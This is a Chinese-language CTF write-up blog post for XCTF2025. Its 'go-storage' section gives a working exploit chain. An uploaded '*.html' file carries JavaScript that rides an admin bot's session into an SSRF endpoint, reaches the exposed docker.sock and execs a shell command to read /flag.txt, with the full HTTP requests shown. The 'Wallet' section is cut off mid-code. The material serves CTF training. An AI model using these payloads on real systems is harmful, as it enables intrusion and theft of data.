<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XCTF2025 | ArcNova</title><meta name="author" content="ArcNova"><meta name="copyright" content="ArcNova"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XCTF2025go-storage || XXX || SOLVED题目描述 People say golang is secure, so I’m rewriting legacy code to golang for my data storage service. The title environment is 173.32.X.210:80, where X is the team I">
<meta property="og:type" content="article">
<meta property="og:title" content="XCTF2025">
<meta property="og:url" content="https://arcnova7.github.io/2025/12/08/XCTF2025/index.html">
<meta property="og:site_name" content="ArcNova">
<meta property="og:description" content="XCTF2025go-storage || XXX || SOLVED题目描述 People say golang is secure, so I’m rewriting legacy code to golang for my data storage service. The title environment is 173.32.X.210:80, where X is the team I">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://adworld.xctf.org.cn/media/news_cover/70000635-d985-45d7-9682-3c71c1fb6928.png">
<meta property="article:published_time" content="2025-12-08T15:49:36.000Z">
<meta property="article:modified_time" content="2025-12-14T03:13:29.539Z">
<meta property="article:author" content="ArcNova">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://adworld.xctf.org.cn/media/news_cover/70000635-d985-45d7-9682-3c71c1fb6928.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "XCTF2025",
  "url": "https://arcnova7.github.io/2025/12/08/XCTF2025/",
  "image": "https://adworld.xctf.org.cn/media/news_cover/70000635-d985-45d7-9682-3c71c1fb6928.png",
  "datePublished": "2025-12-08T15:49:36.000Z",
  "dateModified": "2025-12-14T03:13:29.539Z",
  "author": [
    {
      "@type": "Person",
      "name": "ArcNova",
      "url": "https://ArcNova7.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/icons8.jpg"><link rel="canonical" href="https://arcnova7.github.io/2025/12/08/XCTF2025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'XCTF2025',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-video"></i><span> gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://adworld.xctf.org.cn/media/news_cover/70000635-d985-45d7-9682-3c71c1fb6928.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ArcNova</span></a><a class="nav-page-title" href="/"><span class="site-name">XCTF2025</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-video"></i><span> gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">XCTF2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-12-08T15:49:36.000Z" title="Created 2025-12-08 23:49:36">2025-12-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-12-14T03:13:29.539Z" title="Updated 2025-12-14 11:13:29">2025-12-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="XCTF2025"><a href="#XCTF2025" class="headerlink" title="XCTF2025"></a>XCTF2025</h1><h2 id="go-storage-XXX-SOLVED"><a href="#go-storage-XXX-SOLVED" class="headerlink" title="go-storage || XXX || SOLVED"></a>go-storage || XXX || SOLVED</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
<p>People say golang is secure, so I’m rewriting legacy code to golang for my data storage service.</p>
<p>The title environment is 173.32.X.210:80, where X is the team ID</p>
</blockquote>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><ul>
<li><p>上传点的“模板扩展名保持”机制</p>
<ul>
<li>Go 的 os.CreateTemp(dir, pattern)把第二个参数当“模板”。如果模板中包含 *，Go 会用一段随机字符串替换 *。关键是：模板中 * 后面的扩展名会被保留。</li>
</ul>
</li>
<li><p>静态文件服务仅按扩展名设置响应类型，.html 会被浏览器当 HTML 渲染执行。</p>
<ul>
<li><p>getContentType 通过文件名后缀判别 MIME，.html 返回 text&#x2F;html。</p>
</li>
<li><p>服务端不做内容魔数检测、不设置 nosniff，浏览器会当 HTML 解析执行。这样上传的 HTML 能作为“同源页面”运行任意 JS。</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http.<span class="title class_">Handle</span>(<span class="string">&quot;/uploads/&quot;</span>, http.<span class="title class_">StripPrefix</span>(<span class="string">&quot;/uploads/&quot;</span>, http.<span class="title class_">HandlerFunc</span>(<span class="title function_">func</span>(<span class="params">w http.ResponseWriter, r *http.Request</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 仅按后缀判断 Content-Type，.html/.svg 等会被执行</span></span><br><span class="line">    contentType := <span class="title function_">getContentType</span>(fileInfo.<span class="title class_">Name</span>())</span><br><span class="line">    w.<span class="title class_">Header</span>().<span class="title class_">Set</span>(<span class="string">&quot;Content-Type&quot;</span>, contentType)</span><br><span class="line">    http.<span class="title class_">ServeContent</span>(w, r, fileInfo.<span class="title class_">Name</span>(), fileInfo.<span class="title class_">ModTime</span>(), file)</span><br><span class="line">  &#125;)))</span><br></pre></td></tr></table></figure>
</li>
<li><p>管理员 bot 的同源访问与 Cookie 暴露</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置session cookie，模拟已登录状态</span></span><br><span class="line">await page.<span class="title function_ invoke__">setCookie</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;connect.sid&#x27;</span>, // cookie名称</span><br><span class="line">  <span class="attr">value</span>: sess, // cookie值（session ID）</span><br><span class="line">  // <span class="attr">domain</span>: <span class="string">&#x27;portal-service&#x27;</span>,</span><br><span class="line">  <span class="attr">domain</span>: <span class="string">&#x27;nginx-proxy&#x27;</span>, // cookie所属域名</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>, // cookie路径</span><br><span class="line">  <span class="attr">httpOnly</span>: <span class="literal">false</span>, // 允许JavaScript访问此cookie</span><br><span class="line">  <span class="attr">SameSite</span>: <span class="string">&#x27;Lax&#x27;</span>, // SameSite策略，Lax模式允许部分跨站请求携带cookie</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>bot 会先用管理员密码登录，拿到 connect.sid，然后把这个 Cookie 设置到域名 nginx-proxy 且 httpOnly: false。</p>
</li>
<li><p>当 bot 访问你给的 URL 时，如果是 <a target="_blank" rel="noopener" href="http://nginx-proxy/">http://nginx-proxy/</a>… 同源页面，你的 JS 能读取 document.cookie，直接窃取 admin 的会话；或者不窃取，直接在页面里用 fetch 对站内接口（如 &#x2F;admin）发请求，等同于管理员操作。</p>
</li>
</ul>
</li>
<li><p>SSRF 管理端作为二次放大器</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 仅 admin 可用：把 URL + method 交给 superagent 发请求</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/admin&quot;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> superagent[method.<span class="title function_">toLowerCase</span>()](url)</span><br><span class="line">    .<span class="title function_">set</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    .<span class="title function_">send</span>(body);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&quot;admin&quot;</span>, &#123; <span class="attr">response</span>: response.<span class="property">body</span> &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li>&#x2F;admin 提供“指定 URL + 方法”的服务器端请求功能，使用 superagent 转发。尽管模板只渲染 response.body（偏向 JSON），但很多内部管理接口是 JSON 的，足以用来发现容器&#x2F;环境信息。</li>
</ul>
</li>
<li><p>docker.sock 暴露给门户容器</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- /<span class="keyword">var</span>/run/docker.sock:/<span class="keyword">var</span>/run/docker.sock <span class="comment"># 暴露 docker.sock</span></span><br></pre></td></tr></table></figure>

<ul>
<li>环境里把 Docker 的 docker.sock 暴露给了 portal 容器，意味着只要 SSRF 能触到它（或你拿到 admin cookie 本地直接打管理端代理），即可通过 Docker Remote API 进入其它容器，读敏感文件（如存储容器 &#x2F;flag.txt）。</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">POST /upload HTTP/1.1</span><br><span class="line">Host: 192.168.111.129</span><br><span class="line">Content-Length: 1448</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Origin: http://192.168.111.129</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylowixTAUsBPoMVT0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.111.129/upload/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: connect.sid=s%3AOENwjZVOTOpqZkar1ohk0FOgiNQjsU7y.31liqNQCPcdoOfjNuDMWTsNQUuWZmoRpqpTVTHmJOfw</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarylowixTAUsBPoMVT0</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded_data&quot;; filename=&quot;*.html&quot;</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">(<span class="title function_">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> adminUrl = <span class="string">&#x27;http://nginx-proxy/admin&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> createPayload = &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">url</span>: <span class="string">&#x27;http+unix://%2Fvar%2Frun%2Fdocker.sock/v1.41/containers/storage-service/exec&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">body</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">AttachStdout</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">AttachStderr</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">Cmd</span>: [<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-lc&quot;</span>,<span class="string">&quot;cat /flag.txt &gt; /app/src/uploads/flag.jpg&quot;</span>]</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> r1 = <span class="keyword">await</span> <span class="title function_">fetch</span>(adminUrl, &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(createPayload)</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> t1 = <span class="keyword">await</span> r1.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> m = t1.<span class="title function_">match</span>(<span class="regexp">/Id&amp;#34;: &amp;#34;(.*)&amp;#34;/i</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (!m) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;can not find exec Id&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> execId = m[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> startPayload = &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">url</span>: <span class="string">`http+unix://%2Fvar%2Frun%2Fdocker.sock/v1.41/exec/<span class="subst">$&#123;execId&#125;</span>/start`</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">body</span>: &#123; <span class="title class_">Detach</span>: <span class="literal">false</span> &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> r2 = <span class="keyword">await</span> <span class="title function_">fetch</span>(adminUrl, &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(startPayload)</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">await</span> r2.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    location.<span class="property">href</span> = <span class="string">&#x27;/uploads/flag.jpg&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">textContent</span> = <span class="string">&#x27;error: &#x27;</span> + e;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">------WebKitFormBoundarylowixTAUsBPoMVT0--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2025/12/08/XCTF2025/image.png"></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">POST</span> <span class="string">/visit</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="number">192.168</span><span class="number">.111</span><span class="number">.129</span></span><br><span class="line"><span class="attr">Content-Length:</span> <span class="number">60</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Windows</span> <span class="string">NT</span> <span class="number">10.0</span><span class="string">;</span> <span class="string">Win64;</span> <span class="string">x64)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/129.0.6668.71</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">application/x-www-form-urlencoded</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">*/*</span></span><br><span class="line"><span class="attr">Origin:</span> <span class="string">http://192.168.111.129</span></span><br><span class="line"><span class="attr">Referer:</span> <span class="string">http://192.168.111.129/profile</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate,</span> <span class="string">br</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">connect.sid=s%3AOENwjZVOTOpqZkar1ohk0FOgiNQjsU7y.31liqNQCPcdoOfjNuDMWTsNQUuWZmoRpqpTVTHmJOfw</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">keep-alive</span></span><br><span class="line"></span><br><span class="line"><span class="string">message=http%3A%2F%2Fnginx-proxy%2Fuploads%2F1319040003.html</span></span><br></pre></td></tr></table></figure>



<p><img src="/2025/12/08/XCTF2025/image1.png"></p>
<hr>
<h2 id="Wallet-XXX-SOLVED"><a href="#Wallet-XXX-SOLVED" class="headerlink" title="Wallet || XXX || SOLVED"></a>Wallet || XXX || SOLVED</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>Can u get enough balance..?</p>
<h3 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h3><h3 id="服务部署架构"><a href="#服务部署架构" class="headerlink" title="服务部署架构"></a>服务部署架构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户请求 → Gateway (端口3000, Fastify + WAF规则)</span><br><span class="line">              ↓ (代理转发)</span><br><span class="line">         Backend (端口4000, Express + 业务逻辑)</span><br></pre></td></tr></table></figure>

<p>两个服务运行在同一个 Docker 容器中：</p>
<ul>
<li><p>Gateway: 监听 0.0.0.0:3000 (对外暴露)</p>
</li>
<li><p>Backend: 监听 127.0.0.1:4000 (内部访问)</p>
</li>
</ul>
<p>获取 flag 的条件: 账户余额 ≥ 100,000.01</p>
<ul>
<li><p>Admin 初始余额: 100,000</p>
</li>
<li><p>普通用户初始余额: 0</p>
</li>
<li><p>Flag 存储在: &#x2F;flag 文件中</p>
</li>
</ul>
<h3 id="Gateway-网关层-WAF防护"><a href="#Gateway-网关层-WAF防护" class="headerlink" title="Gateway (网关层 - WAF防护)"></a>Gateway (网关层 - WAF防护)</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">addHook</span>(<span class="string">&#x27;preParsing&#x27;</span>, <span class="title function_">async</span> (req, reply, payload) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> normalizedUrl = <span class="built_in">decodeURIComponent</span>(req.<span class="property">url</span>)</span><br><span class="line">    .<span class="title function_">toLowerCase</span>()</span><br><span class="line">    .<span class="title function_">split</span>(<span class="regexp">/[?#]/</span>)[<span class="number">0</span>]</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/\/+$/</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (normalizedUrl === <span class="string">&quot;/transfer&quot;</span> &amp;&amp; req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> chunks = [];</span><br><span class="line">    <span class="keyword">for</span> <span class="title function_">await</span> (<span class="keyword">const</span> chunk <span class="keyword">of</span> payload) &#123;</span><br><span class="line">      chunks.<span class="title function_">push</span>(chunk);</span><br><span class="line">    